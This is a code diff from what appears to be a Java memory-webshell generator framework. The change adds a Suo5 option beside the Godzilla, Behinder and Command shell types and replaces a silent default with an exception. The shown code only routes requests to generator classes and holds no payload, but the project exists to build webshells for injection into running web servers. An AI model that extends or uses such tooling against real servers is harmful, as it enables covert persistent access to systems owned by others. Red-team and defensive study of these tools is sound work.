@@ -1,10 +1,7 @@
 package com.reajason.javaweb.memshell;
 
 import com.reajason.javaweb.memshell.config.*;
-import com.reajason.javaweb.memshell.generator.BehinderGenerator;
-import com.reajason.javaweb.memshell.generator.CommandGenerator;
-import com.reajason.javaweb.memshell.generator.GodzillaGenerator;
-import com.reajason.javaweb.memshell.generator.InjectorGenerator;
+import com.reajason.javaweb.memshell.generator.*;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.Collections;
@@ -74,12 +71,17 @@ public abstract class AbstractShell {
         return Collections.emptyMap();
     }
 
+    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
+        return Collections.emptyMap();
+    }
+
     private Pair<Class<?>, Class<?>> getShellInjectorPair(ShellTool shellTool, String shellType) {
         Map<String, Pair<Class<?>, Class<?>>> shellMap = switch (shellTool) {
             case Godzilla -> getGodzillaShellMap();
             case Command -> getCommandShellMap();
             case Behinder -> getBehinderShellMap();
-            default -> Collections.emptyMap();
+            case Suo5 -> getSuo5ShellMap();
+            default -> throw new UnsupportedOperationException("Unknown shell type: " + shellType);
         };
         return shellMap.get(shellType);
     }
@@ -89,6 +91,7 @@ public abstract class AbstractShell {
             case Godzilla -> new GodzillaGenerator(shellConfig, (GodzillaConfig) shellToolConfig).getBytes();
             case Command -> CommandGenerator.generate(shellConfig, (CommandConfig) shellToolConfig);
             case Behinder -> new BehinderGenerator(shellConfig, (BehinderConfig) shellToolConfig).getBytes();
+            case Suo5 -> new Suo5Generator(shellConfig, ((Suo5Config) shellToolConfig)).getBytes();
             default -> throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
         };
     }
